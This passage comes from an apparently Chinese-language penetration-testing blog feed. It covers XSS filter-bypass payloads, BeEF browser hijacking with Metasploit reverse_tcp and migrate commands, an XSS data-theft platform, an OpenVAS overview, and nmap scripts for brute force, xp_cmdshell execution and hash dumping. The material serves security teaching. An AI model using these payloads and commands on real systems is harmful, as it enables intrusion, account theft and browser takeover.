onerror=&quot;alert(/xss/)&quot; /&gt;    #双引号</span><br><span class="line">&lt;img src=&#x27;#&#x27; onerror=alert(/xss/) /&gt;    #无引号</span><br></pre></td></tr></table></figure><p>3、使用左斜线代替空格：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/src=<span class="string">&quot;#&quot;</span>/onerror=<span class="string">&#x27;alert(/xss/)&#x27;</span>/&gt;</span><br></pre></td></tr></table></figure><p>4、在关键字中间插入Tab和Enter，来绕过对关键字的检测</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;#&quot;</span> onerror    =<span class="string">&quot;alert(/xss/)&quot;</span> /&gt;</span><br><span class="line">&lt;a hREf=<span class="string">&quot;java</span></span><br><span class="line"><span class="string">Scr    i</span></span><br><span class="line"><span class="string">p    t:alert(/xss/)&quot;</span>&gt;touch me!&lt;/a&gt;    </span><br></pre></td></tr></table></figure><p>5、对标签属性值进行转码，用来绕过过滤</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># a的ASCII码是97/x61</span><br><span class="line">&lt;a hREf=<span class="string">&quot;j&amp;#97;v&amp;#x61;Script:alert(/xss/)&quot;</span>&gt;touch me!&lt;/a&gt;</span><br><span class="line">#!!    可以将它们插到关键中的任意位置：Tab: &amp;#9 、 换行符: &amp;#10 、 回车: &amp;#13 </span><br><span class="line">#!! 可以将它们插到头部的位置：SOH: &amp;#01、STX: &amp;#02    (控制字符，标识着文本的开始)</span><br><span class="line">&lt;a hREf=<span class="string">&quot;&amp;#01;j&amp;#97;v&amp;#x61;S&amp;#9;c&amp;#10;r&amp;#13;ipt:alert(/xss/)&quot;</span>&gt;touch me!&lt;/a&gt;</span><br></pre></td></tr></table></figure><p>6、双写绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scr&lt;script&gt;ipt&gt;&lt;&#x2F;scr&lt;script&gt;ipt&gt;</span><br></pre></td></tr></table></figure><p>7、拆分跨站脚本：用于shellcode太长，服务器端设置了长度限制的情况</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;z=<span class="string">&#x27;alert&#x27;</span>&lt;/script&gt;</span><br><span class="line">&lt;script&gt;z=z+<span class="string">&#x27;(/xss)&lt;/script&gt;&#x27;</span></span><br><span class="line">&lt;script&gt;<span class="built_in">eval</span>(z)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="六、XSS漏洞的利用"><a href="#六、XSS漏洞的利用" class="headerlink" title="六、XSS漏洞的利用"></a>六、XSS漏洞的利用</h3><p>1、远程调用js：将JS代码放在一个服务器上，exp直接调用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;XXXX&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>2、windows.location.hash绕过利用</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">eval</span>(location.hash.substr(<span class="number">1</span>))&lt;<span class="regexp">/script&gt;#alert(/</span>xss/)</span><br></pre></td></tr></table></figure><p>3、XSS Downloader</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>4、备选存储技术(Cookie—XSS)：其实本质上就是构造服务端的输入，来达到组织出js代码的目的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">通过设置cookie来实现反弹xss。</span><br></pre></td></tr></table></figure><h3 id="七、XSS的防御"><a href="#七、XSS的防御" class="headerlink" title="七、XSS的防御"></a>七、XSS的防御</h3><h4 id="1、过滤输入XSS-Filter"><a href="#1、过滤输入XSS-Filter" class="headerlink" title="1、过滤输入XSS Filter"></a>1、过滤输入XSS Filter</h4><p>​    1）输入验证：对用户的输入做限制，仅接受指定长度范围内的、采用适当格式的内容提交，阻止或者忽略除此之外的其他数据。</p><blockquote><p>输入是否仅包含合法字符、是否超过长度限制、数字规定范围、是否符合特殊格式(email、IP等)要求。</p></blockquote><p>​    2）输入过滤：过滤和净化掉有害的输入</p><h4 id="2、输出编码"><a href="#2、输出编码" class="headerlink" title="2、输出编码"></a>2、输出编码</h4><p>可以将输出直接转换为HTML实体，使其无法称为页面的标签部分。</p><blockquote><p>PHP：htmlspecialchars()、htmlentities()    [两个函数默认都不对双引号进行过滤]</p></blockquote><h4 id="3、黑白名单式的过滤"><a href="#3、黑白名单式的过滤" class="headerlink" title="3、黑白名单式的过滤"></a>3、黑白名单式的过滤</h4><p>针对不同的情况，规定不同的黑白名单，统一进行过滤</p><h3 id="八、XSS神器——beef-xss-浏览器劫持"><a href="#八、XSS神器——beef-xss-浏览器劫持" class="headerlink" title="八、XSS神器——beef-xss(浏览器劫持)"></a>八、XSS神器——beef-xss(浏览器劫持)</h3><p>beef是一个XSS漏洞的利用平台。</p><p>1、beef的基础：</p><blockquote><p>kali中beef的配置文件在：/usr/share/beef-xss（用户名密码配置）</p></blockquote><p>Web界面管理控制台：XXXXX:3000/ui/panel</p><p>木马钩子：XXXXX:3000/hook.js    #此钩子是核心，可导入到任意网页，使其有劫持浏览器用户的能力</p><p>测试页面：XXXX:3000/demos/butcher/index.html</p><p>2、作用</p><p>钩子勾上人就可以劫持浏览器做非常多的操作，还可以通过劫持跳转，利用MSF的漏洞服务网站获得shell，通过msf还可以切换进程到1420explorer.exe或其它进程来让shell权限持久，否则肉鸡一更换网页或关闭浏览器就会中断连接。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/browser/ms10_002_aurora     <span class="comment">#ms12063可打win7</span></span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> SRVHOST 漏洞网站IP</span><br><span class="line"><span class="built_in">set</span> LHOST 本地监听IP</span><br><span class="line">session -i 1</span><br><span class="line">ps/getuid/getpid/shell/migrate进程号</span><br></pre></td></tr></table></figure><h3 id="九、XSS平台——浏览器数据劫持"><a href="#九、XSS平台——浏览器数据劫持" class="headerlink" title="九、XSS平台——浏览器数据劫持"></a>九、XSS平台——浏览器数据劫持</h3><blockquote><p>xsspt.com</p></blockquote><p>可以生成xss攻击代码的项目，最后生成一个可导入的js标签，一旦有人受到这个js的攻击，便会给xss平台我们的项目信息中发送我们想要的数据。</p>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>漏洞扫描技术</title>
      <link href="/2020/08/03/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3%E3%80%81%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF/"/>
      <url>/2020/08/03/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/3%E3%80%81%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="网络漏洞扫描"><a href="#网络漏洞扫描" class="headerlink" title="网络漏洞扫描"></a>网络漏洞扫描</h2><h3 id="一、漏洞扫描器"><a href="#一、漏洞扫描器" class="headerlink" title="一、漏洞扫描器"></a>一、漏洞扫描器</h3><p>1、Nessus：</p><p>2、openVAS开放式漏洞评估系统：Greenbone漏洞管理（GVM）解决方案的开放漏洞评估扫描程序（OpenVAS）。当前最好的开源漏洞扫描器，可以执行网络漏洞测试（NVT）依据漏洞库对设备的安全问题进行检测。</p><p>3、AWVS漏洞扫描器</p><blockquote><p>漏洞扫描器并不是万能的，会有误报、漏报的问题。</p></blockquote><h3 id="二、漏洞扫描的分类"><a href="#二、漏洞扫描的分类" class="headerlink" title="二、漏洞扫描的分类"></a>二、漏洞扫描的分类</h3><p>1、黑盒扫描：无主机权限，通过工具远程识别目标的服务、服务类型以及版本，对其是否有漏洞进行测试。</p><p>2、白盒扫描：具有主机权限，对于计算机中的杀毒软件来说，进行的操作就是白盒扫描。</p><h3 id="三、OpenVAS"><a href="#三、OpenVAS" class="headerlink" title="三、OpenVAS"></a>三、OpenVAS</h3><blockquote><p>推荐配置：VirutualBox、Linux系统、其它Linux64位、内存4G、硬盘9G、Cpu分配2个</p></blockquote><p>1、OpenVAS架构</p><p><a href="https://imgchr.com/i/aa1veU"><img src="https://s1.ax1x.com/2020/08/03/aa1veU.png" alt="aa1veU.png"></a></p><table><thead><tr><th align="center"><strong>服务器层组件（建议都安装）</strong></th><th align="center"><strong>客户层组件（任选其一安装即可）</strong></th><th></th><th></th></tr></thead><tbody><tr><td align="center">OpenVAS-scanner(扫描器)</td><td align="center">负责调用各种漏洞检测插件，完成实际的扫描操作。</td><td>OpenVAS-cli（命令行接口）</td><td>负责提供从命令行访问OpenVAS服务层程序。</td></tr><tr><td align="center">OpenVAS-manager(管理器)</td><td align="center">负责分配扫描任务，并根据扫描结果生产评估报告。</td><td>Greenbone-security-assistant(安全助手)</td><td>负责提供访问OpenVAS服务层的Web接口，便于通过浏览器来建立扫描任务，是使用最简便的客户层组件。</td></tr><tr><td align="center">OpenVAS-administrator(管理者)</td><td align="center">负责管理配置信息，用户授权等相关工作。</td><td>Greenbone-Desktop-Suite(桌面套件)</td><td>负责提供访问OpenVAS服务层的图形程序界面，主要在windows系统中使用。</td></tr></tbody></table><p>2、安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">配置：yes-&gt;Skip-&gt;yes-&gt;确保Ipv4、DHCP是enabled状态。-&gt;设置Web端用户名密码-&gt;Skip</span><br><span class="line"></span><br><span class="line">Maintenance Menu -&gt; Feed -&gt; Update</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nmap端口扫描技术</title>
      <link href="/2020/08/03/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2%E3%80%81nmap%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF/"/>
      <url>/2020/08/03/%E9%98%B6%E6%AE%B5%E5%9B%9B%E3%80%81Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/2%E3%80%81nmap%E6%89%AB%E6%8F%8F%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="nmap端口扫描技术"><a href="#nmap端口扫描技术" class="headerlink" title="nmap端口扫描技术"></a>nmap端口扫描技术</h2><blockquote><p><a href="http://www.h3c.com/cn/d_201508/888907_30008_0.htm">http://www.h3c.com/cn/d_201508/888907_30008_0.htm</a></p></blockquote><h3 id="一、Nmap的扫描方式"><a href="#一、Nmap的扫描方式" class="headerlink" title="一、Nmap的扫描方式"></a>一、Nmap的扫描方式</h3><blockquote><p>发现目标环境中有哪些资产，联网设备、主机、服务器以及各种服务等。</p></blockquote><h4 id="1、主机发现"><a href="#1、主机发现" class="headerlink" title="1、主机发现"></a>1、主机发现</h4><table><thead><tr><th><strong>扫描方式</strong></th><th><strong>发送报文</strong></th><th><strong>活跃响应</strong></th><th><strong>不活跃响应</strong></th><th><strong>被过滤响应</strong></th><th><strong>备注</strong></th></tr></thead><tbody><tr><td>ARP扫描</td><td>ARP请求报文</td><td>ARP响应报文</td><td>超时</td><td>不会被过滤</td><td>精准</td></tr><tr><td>ICMP扫描</td><td>ICMPtype=8 code=0type=13 code=0type=17 code=0</td><td>ICMPtype=0 code=0type=14 code=0type=18 code=0</td><td>超时</td><td>超时</td><td>可能会被防火墙过滤</td></tr><tr><td>端口扫描</td><td>TCP syn</td><td>TCP syn+ack</td><td>超时</td><td>超时或ICMP type=3 code=3或13</td><td>可能会被过滤</td></tr></tbody></table><p>ARP扫描是最精准的扫描方式，并且不会被过滤，因此会被强制有限使用。ICMP扫描是最常见的扫描方式，和ping命令原理一致，但现有很多防火墙和IPS设备会禁用ICMP扫描，使得ICMP主机发现失败。端口扫描技术是另一种发现主机的方式，准确且不容易被防火墙过滤，这种方式被经常使用，端口扫描原理见2.2节。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -nP 目标IP #只进行主机探测，不进行端口扫描</span><br></pre></td></tr></table></figure><h4 id="2、端口扫描技术"><a href="#2、端口扫描技术" class="headerlink" title="2、端口扫描技术"></a>2、端口扫描技术</h4><p>端口扫描可以分为TCP端口扫描和UDP端口扫描，由于TCP能够提供更多的协议字段，因此TCP端口扫描更准确，如今的端口扫描技术主要是指TCP端口扫描。</p><p>在TCP端口扫描中，探测报文组合不同flags位，不同的flags在端口开放、端口关闭、防火墙过滤时的响应是不一样的，通过区分不同的响应来检测端口的状态，具体如2所示。（tcp flags有syn、ack、rst、fin、psh、urg共6种置位）</p><blockquote><p>-sV 可获得端口对应服务的版本</p><p>-O 获得操作系统信息</p><p>-oN 保存结果为文本格式</p><p>-oX 保存结果为xml格式</p></blockquote><table><thead><tr><th><strong>扫描方式</strong></th><th><strong>TCP Flag</strong></th><th><strong>开放时响应</strong></th><th><strong>关闭时响应</strong></th><th><strong>过滤时响应</strong></th><th><strong>特征</strong></th></tr></thead><tbody><tr><td>-sT，TCP全连接扫描</td><td>报文1：syn报文2：ack</td><td>syn+ack，完成3次握手</td><td>rst+ack</td><td>一般不会被过滤</td><td>精准、费时、可能会被日志记录</td></tr><tr><td>-sS，TCP半连接扫描</td><td>syn</td><td>syn+ack</td><td>rst+ack</td><td>ICMP type=3 code=3、13或超时</td><td>精准、快速、无日志记录，最常见且默认的扫描方式</td></tr><tr><td>-sA，TCP ack扫描</td><td>ack</td><td>rst</td><td>rst</td><td>不准确、只能判断是否加防火墙filtered或unfiltered</td><td></td></tr><tr><td>-sW，TCP window扫描</td><td>ack</td><td>rst，window不为0</td><td>rst，window为0</td><td>不准确、有的情况下window都为0</td><td></td></tr><tr><td>-sM</td><td>fin+ack</td><td>未收到rst</td><td>rst</td><td>不准确</td><td></td></tr><tr><td>-sN</td><td>无置位</td><td>无响应</td><td>rst</td><td>ICMP type=3 code=3或13或超时无响应</td><td>不准确，只能判断closed和open|filtered</td></tr><tr><td>-sF</td><td>fin</td><td>无响应</td><td>rst</td><td></td><td></td></tr><tr><td>-sX</td><td>fin+psh+urg</td><td>无响应</td><td>rst</td><td></td><td></td></tr><tr><td>-sU，UDP端口扫描</td><td>不相关</td><td>有UDP响应或无响应</td><td>icmp type=3 code=3</td><td>ICMP type=3 code=1,2,9,10,13</td><td>不准确，通常只能判断closed和open|filtered</td></tr></tbody></table><h4 id="3、其它技术"><a href="#3、其它技术" class="headerlink" title="3、其它技术"></a>3、其它技术</h4><p>Nmap还包括操作系统指纹识别技术、服务识别技术、防火墙绕过技术以及NSE（Nmap Scripting Engine）脚本引擎。</p><h3 id="二、Nmap的端口状态"><a href="#二、Nmap的端口状态" class="headerlink" title="二、Nmap的端口状态"></a>二、Nmap的端口状态</h3><p>nmap对端口进行扫描中，当nmap向目标主机发送报文并根据返回报文从而认定端口的6种状态的含义（注意：这六种状态只是nmap认为的端口状态，例如：有些主机或者防火墙会返回一些不可靠的报文从而妨碍nmap对端口开放问题的确认）。</p><ol><li><p><code>Open</code>：端口处于开放状态，例如：当nmap使用TCP SYN对目标主机某一范围的端口进行扫描时，我们知道 TCP SYN报文是TCP建立连接的第一步，所以，如果目标主机返回SYN+ACK的报文，我们就认为此端口开放了并且使用了TCP服务。</p></li><li><p><code>Closed</code>：端口处于关闭状态。例如：TCP SYN类型的扫描，如果返回RST类型的报文，则端口处于管理状态。这里我们值得注意的是<u>关闭的端口也是可访问的，只是没有上层的服务在监听这个端口</u>，<u>而且，只是在我们扫描的这个时刻为关闭，当我们在另一个时间段进行扫描的时候，这些关闭的端口可能会处于open的状态</u>。</p></li><li><p><code>Filtered（过滤的）</code>：由于<u>报文无法到达指定的端口，nmap不能够决定端口的开放状态</u>，这主要是由于网络或者主机安装了一些防火墙所导致的。当nmap收到icmp报文主机不可达报文（例如：type为3，code为13（communication administratively prohibit）报文）或者目标主机无应答，常常会将目标主机的状态设置为filtered。</p></li><li><p><code>Unfiltered（未被过滤的）</code>：当nmap不能确定端口是否开放的时候所打上的状态，这种状态和filtered的区别在于：<u>unfiltered的端口能被nmap访问，但是nmap根据返回的报文无法确定端口的开放状态，而filtered的端口直接就没就没能够被nmap访问</u>。端口被定义为Unfilterd只会发生在TCP ack扫描类型时当返回RST的报文。而端口被定义为filtered 状态的原因是是报文被防火墙设备，路由器规则，或者防火墙软件拦截，无法送达到端口，这通常表现为发送NMAP的主机收到ICMP报错报文，如：TYPE为3，code为13的报文（通信被认为的禁止 communication administratively prohibited），或者主机通过多次重复发送没有收到任何回应）。</p></li><li><p><code>Open|filtered</code>状态，这种状态主要是nmap无法区别端口处于open状态还是filtered状态。这种状态只会出现在open端口对报文不做回应的扫描类型中，如：udp，ip protocol ，TCP null，fin，和xmas扫描类型。</p></li><li><p><code>Closed|filtered</code>状态，这种状态主要出现在nmap无法区分端口处于closed还是filtered时。此状态只会出现在IP ID idle scan中。</p></li></ol><table><thead><tr><th><strong>状态</strong></th><th><strong>说明</strong></th></tr></thead><tbody><tr><td>open</td><td>应用程序在该端口接收 TCP 连接或者 UDP 报文</td></tr><tr><td>closed</td><td>关闭的端口对于nmap也是可访问的， 它接收nmap探测报文并作出响应。但没有应用程序在其上监听</td></tr><tr><td>filtered</td><td>由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙</td></tr><tr><td>unfiltered</td><td>未被过滤状态意味着端口可访问，但是nmap无法确定它是开放还是关闭。 只有用于映射防火墙规则集的 ACK 扫描才会把端口分类到这个状态</td></tr><tr><td>open | filtered</td><td>无法确定端口是开放还是被过滤， 开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议，　FIN, Null 等扫描会引起。</td></tr></tbody></table><h3 id="三、Nmap常用命令"><a href="#三、Nmap常用命令" class="headerlink" title="三、Nmap常用命令"></a>三、Nmap常用命令</h3><ul><li><p>格式：<br>nmap [ &lt;扫描类型&gt; …] [ &lt;选项&gt; ] { &lt;扫描目标说明&gt; }</p></li><li><p>常用命令</p><blockquote><p>全面扫描：nmap-T4 -p-（1-65535端口） -A targetip<br>主机发现：nmap-T4 -sn targetip<br>端口扫描：nmap-T4 targetip<br>服务扫描：nmap-T4 -sV targetip<br>操作系统扫描：nmap-T4 -O targetip</p></blockquote></li><li><p>扫描类型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sP  只探测主机在线情况</span><br><span class="line">-sS  SYN扫描（隐身扫描）</span><br><span class="line">-ST  TCP扫描</span><br><span class="line">-sU  UDP扫描</span><br><span class="line">-sV  系统版本检测</span><br><span class="line">-O   操作系统识别</span><br><span class="line">–scanflags  指定TCP标识位（设置URG, ACK, PSH,RST,SYN,FIN位）</span><br></pre></td></tr></table></figure></li><li><p>时序选项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-T0  偏执的：非常非常慢，用于IDS逃逸</span><br><span class="line">-T1  猥琐的：相当慢，用于IDS逃逸</span><br><span class="line">-T2  有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍</span><br><span class="line">-T3  普通的：默认，根据目标的反应自动调整时间模式</span><br><span class="line">-T4  野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标</span><br><span class="line">-T5  疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口</span><br></pre></td></tr></table></figure></li></ul><h3 id="四、Nmap脚本使用"><a href="#四、Nmap脚本使用" class="headerlink" title="四、Nmap脚本使用"></a>四、Nmap脚本使用</h3><h4 id="脚本命令参数"><a href="#脚本命令参数" class="headerlink" title="脚本命令参数"></a>脚本命令参数</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-sC          等价于–script&#x3D;default，使用默认类别的脚本进行扫描 可更换其他类别 </span><br><span class="line">–script&#x3D;&lt;Lua scripts&gt;               &lt;Lua scripts&gt;使用某个或某类脚本进行扫描，支持通配符描述</span><br><span class="line">–script-args&#x3D;&lt;n1&#x3D;v1,[n2&#x3D;v2,...]&gt;    为脚本提供默认参数</span><br><span class="line">–script-args-file&#x3D;filename          使用文件来为脚本提供参数</span><br><span class="line">–script-trace                       显示脚本执行过程中发送与接收的数据</span><br><span class="line">–script-updatedb                    更新脚本数据库</span><br><span class="line">–script-help&#x3D;&lt;scripts&gt;              显示脚本的帮助信息，其中&lt;scripts&gt;部分可以逗号分隔的文件或脚本类别</span><br></pre></td></tr></table></figure><h4 id="脚本分类"><a href="#脚本分类" class="headerlink" title="脚本分类"></a>脚本分类</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">auth          负责处理鉴权证书（绕开鉴权）绕过目标主机得访问控制的脚本</span><br><span class="line">broadcast     在局域网内探查更多服务开启状况，如dhcp&#x2F;dns&#x2F;sqlserver等服务</span><br><span class="line">brute         提供暴力破解方式，针对常见的应用如http&#x2F;snmp等</span><br><span class="line">default       使用-sC或-A选项扫描时候默认的脚本，提供基本脚本扫描能力</span><br><span class="line">discovery     对网络进行更多的信息，如SMB枚举、SNMP查询等</span><br><span class="line">dos           用于进行拒绝服务攻击</span><br><span class="line">exploit       利用已知的漏洞入侵系统</span><br><span class="line">external      利用第三方的数据库或资源，例如进行whois解析</span><br><span class="line">fuzzer        模糊测试的脚本，发送异常的包到目标机，探测出潜在漏洞 intrusive: 入侵性的脚本，此类脚本可能引发对方的IDS&#x2F;IPS的记录或屏蔽</span><br><span class="line">malware       探测目标机是否感染了病毒、开启了后门等信息</span><br><span class="line">safe          此类与intrusive相反，属于安全性脚本</span><br><span class="line">version       负责增强服务与版本扫描（Version Detection）功能的脚本</span><br><span class="line">vuln          负责检查目标机是否有常见的漏洞（Vulnerability），如是否有MS08_067</span><br></pre></td></tr></table></figure><h4 id="按脚本分类扫描"><a href="#按脚本分类扫描" class="headerlink" title="按脚本分类扫描"></a>按脚本分类扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 负责处理鉴权证书（绕开鉴权）的脚本,也可以作为检测部分应用弱口令</span><br><span class="line">nmap --script&#x3D;auth 192.168.137.*</span><br><span class="line"></span><br><span class="line"># 提供暴力破解的方式  可对数据库，smb，snmp等进行简单密码的暴力猜解</span><br><span class="line">nmap --script&#x3D;brute 192.168.137.*</span><br><span class="line"></span><br><span class="line"># 默认的脚本扫描，主要是搜集各种应用服务的信息，收集到后，可再针对具体服务进行攻击</span><br><span class="line">nmap --script&#x3D;default 192.168.137.* 或者 nmap -sC 192.168.137.*</span><br><span class="line"></span><br><span class="line"># 检查是否存在常见漏洞</span><br><span class="line">nmap --script&#x3D;vuln 192.168.137.*   </span><br><span class="line"></span><br><span class="line"># 在局域网内探查更多服务开启状况</span><br><span class="line">nmap -n -p445 --script&#x3D;broadcast 192.168.137.4</span><br><span class="line"></span><br><span class="line"># 利用第三方的数据库或资源，例如进行whois解析</span><br><span class="line">nmap --script external 202.103.243.110</span><br></pre></td></tr></table></figure><h4 id="按应用服务扫描"><a href="#按应用服务扫描" class="headerlink" title="按应用服务扫描"></a>按应用服务扫描</h4><h5 id="vnc扫描："><a href="#vnc扫描：" class="headerlink" title="vnc扫描："></a>vnc扫描：</h5><ol><li><p>检查vnc bypass</p><blockquote><p>nmap –script=realvnc-auth-bypass 192.168.137.4</p></blockquote></li><li><p>检查vnc认证方式</p><blockquote><p>nmap –script=vnc-auth 192.168.137.4 </p></blockquote></li><li><p>获取vnc信息</p><blockquote><p>nmap –script=vnc-info 192.168.137.4</p></blockquote><h5 id="smb扫描："><a href="#smb扫描：" class="headerlink" title="smb扫描："></a>smb扫描：</h5></li><li><p>smb破解</p><blockquote><p>nmap –script=smb-brute.nse -p445 192.168.137.4 </p></blockquote></li><li><p>smb字典破解</p><blockquote><p>nmap –script=smb-brute.nse –script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4</p></blockquote></li><li><p>smb已知几个严重漏</p><blockquote><p>nmap –script=smb-check-vulns.nse –script-args=unsafe=1 192.168.137.4</p></blockquote></li><li><p>查看共享目录</p><blockquote><p>nmap -p 445 –script smb-ls –script-args ‘share=e$,path=,smbuser=test,smbpass=test’ 192.168.137.4</p></blockquote></li><li><p>smb-psexec: 用登陆凭据作为脚本参数，在目标机器上运行一系列程序（注：需要下载nmap_service）</p><blockquote><p>nmap –script smb-psexec.nse –script-args=smbuser=,smbpass=[,config=] -p445 </p></blockquote></li><li><p>查看会话</p><blockquote><p>nmap -n -p445 –script=smb-enum-sessions.nse –script-args=smbuser=test,smbpass=test 192.168.137.4 </p></blockquote></li><li><p>系统信息</p><blockquote><p>nmap -n -p445 –script=smb-os-discovery.nse –script-args=smbuser=test,smbpass=test 192.168.137.4</p></blockquote><h5 id="Mssql扫描："><a href="#Mssql扫描：" class="headerlink" title="Mssql扫描："></a>Mssql扫描：</h5></li><li><p>猜解mssql用户名和密码</p><blockquote><p>nmap -p1433 –script=ms-sql-brute –script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4</p></blockquote></li><li><p>xp_cmdshell 执行命令</p><blockquote><p>nmap -p 1433 –script ms-sql-xp-cmdshell –script-args  mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd=”net user”  192.168.137.4 </p></blockquote></li><li><p>dumphash值</p><blockquote><p>nmap -p 1433 –script ms-sql-dump-hashes.nse –script-args mssql.username=sa,mssql.password=sa 192.168.137.4</p></blockquote><h5 id="Mysql扫描："><a href="#Mysql扫描：" class="headerlink" title="Mysql扫描："></a>Mysql扫描：</h5></li><li><p>检查mysql空密码</p><blockquote><p>nmap -p 3306 –script=mysql-empty-password.nse 192.168.1.114</p></blockquote></li><li><p>如果没有空密码，则可以使用自带的暴力破解功能尝试破解</p><blockquote><p>nmap -p 3306 –script=mysql-brute.nse 192.168.1.114</p></blockquote></li><li><p>如果知道了用户名与密码，可以枚举数据库中的用户</p><blockquote><p>nmap -p 3306 –script=mysql-users.nse –script-args=mysqluser=root 192.168.1.114</p></blockquote></li><li><p>枚举mysql用户信息</p><blockquote><p>nmap -p 3306 –script=mysql-enum.nse 192.168.1.114</p></blockquote></li><li><p>支持同一应用的所有脚本扫描</p><blockquote><p>nmap –script=mysql-* 192.168.137.4</p></blockquote><h5 id="Oracle扫描："><a href="#Oracle扫描：" class="headerlink" title="Oracle扫描："></a>Oracle扫描：</h5></li><li><p>oracle sid扫描</p><blockquote><p>nmap –script=oracle-sid-brute -p 1521-1560 192.168.137.5 </p></blockquote></li><li><p>oracle弱口令破解</p><blockquote><p>nmap –script oracle-brute -p 1521 –script-args oracle-brute.sid=ORCL,userdb=/var/passwd,passdb=/var/passwd 192.168.137.5</p></blockquote><h5 id="其他一些比较好用的脚本"><a href="#其他一些比较好用的脚本" class="headerlink" title="其他一些比较好用的脚本"></a>其他一些比较好用的脚本</h5><blockquote><p>nmap –script=broadcast-netbios-master-browser 192.168.137.4 <code>发现网关</code><br>nmap -p 873 –script rsync-brute –script-args ‘rsync-brute.module=www’ 192.168.137.4 <code>破解rsync</code><br>nmap –script informix-brute -p 9088 192.168.137.4 <code>informix数据库破解</code><br>nmap -p 5432 –script 